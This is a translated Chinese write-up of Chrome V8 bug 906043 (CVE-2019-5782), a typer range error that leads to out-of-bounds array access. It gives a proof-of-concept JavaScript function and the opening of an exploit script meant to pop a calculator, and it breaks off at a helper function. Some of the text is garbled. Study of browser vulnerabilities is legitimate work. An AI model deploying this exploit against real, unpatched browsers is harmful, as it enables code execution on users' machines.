# Chrome issue 906043（CVE-2019-5782）
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0 环境与背景知识
####  0.1 环境
下面是chrome的bug网站关于这个issue的内容
[https://bugs.chromium.org/p/chromium/issues/detail?id=906043&q=906043&can=2](https://bugs.chromium.org/p/chromium/issues/detail?id=906043&q=906043&can=2)
在下面的commit中,找到一个含有漏洞的版本
之后使用ninja进行编译 version 7.2.0
####  0.2 背景知识
JavaScirpt中有一个用来查看传递参数个数的方法
    arguments.length  >= 16 | Range(0,0) | 1  
idx *= 1337 | Range(0,0) | 1337  
优化时得到的结果是Range(0,0),运行时可以访问更大的范围
造成OOB
## 2 POC
根据上面的表格与之前的test函数很容易写出poc
####  poc.js
    tujiefunction foo(args)
    {
        // Array.prototype.fill();
        let idx = arguments.length;
        idx >>= 16;
        idx *= 1337;
        print(idx);
        let oobArray = [1.0,1.1,1.2,1.3];
        // return oobArray[idx];
        print(oobArray[idx])
        // oobArray[idx] = 1.74512933848984e-310;//i2f(0x202000000000);
        // return oobArray;
    }
    let f_arr = [1.0];
    let arr = [1.0,1.1];
    arr.length = 1
    NumberShiftRight Range(0,0)
这里的优化过程在图上没有反映出来,可以在源码中下断点查看优化的过程
## 3 exp
这里的exp最终的效果是弹出计算器,没有去做更多的,因为主要是学习优化的流程与浮现这个洞
这部分的原理没有详细介绍,可以查阅之前的文章理解一下object ArrayBuffer wasm的知识
####  3.1 修改数组大小
debug得到我们应该修改idx=7为更大的length
对应的修改数组的脚本
    /*************************************************************
     * File Name: m_exp.js
     * 
     * Created on: xx.xx.xx
     * Author: init-0
     * 
     * Last Modified: 
     * Description: exp for 906043
     * version version 7.2.0
    ************************************************************/
    function hex(i)
    {
        return i.toString(16).padStart(16, "0");